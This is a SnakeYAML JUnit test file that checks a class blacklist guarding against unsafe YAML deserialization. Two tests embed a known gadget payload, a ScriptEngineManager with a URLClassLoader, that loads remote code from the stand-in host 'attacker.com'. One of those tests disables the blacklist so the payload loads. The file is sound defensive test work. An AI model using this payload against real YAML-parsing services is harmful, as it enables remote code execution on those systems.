/**
 * Copyright (c) 2008, SnakeYAML
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package org.yaml.snakeyaml.issues.issue564;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import java.util.ArrayList;
import java.util.List;
import org.junit.Test;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;

public class BlackListTest {

  /**
   * https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/
   */
  @Test
  public void testBlackListScriptEngineManager() {
    try {
      String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
          + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
      Yaml yaml = new Yaml(); // Unsafe instance of Yaml that allows any constructor to be called.
      yaml.load(malicious); // Make request to http://attacker.com

      fail("ScriptEngineManager should not be accepted");
    } catch (Exception e) {
      assertTrue(e.getMessage().startsWith("Class is blacklisted."));
    }
  }

  @Test
  public void testWhiteListScriptEngineManager() {
    LoaderOptions options = new LoaderOptions();
    options.setBlackListClasses(new ArrayList<Class>());

    String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
        + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
    Yaml yaml = new Yaml(options); // Unsafe instance of Yaml that allows any constructor to be
    // called.
    Object obj = yaml.load(malicious); // Make request to http://attacker.com
    assertNotNull(obj);
  }

  @Test
  public void testBlackListIsImmutable() {
    LoaderOptions options = new LoaderOptions();
    List<Class> black = options.getBlackListClasses();
    try {
      black.add(this.getClass());
      fail("No way to modify the black list.");
    } catch (UnsupportedOperationException e) {
      //
    }
  }

  @Test
  public void testDefaultBlackListSize() {
    LoaderOptions options = new LoaderOptions();
    assertEquals(4, options.getBlackListClasses().size());
  }
}
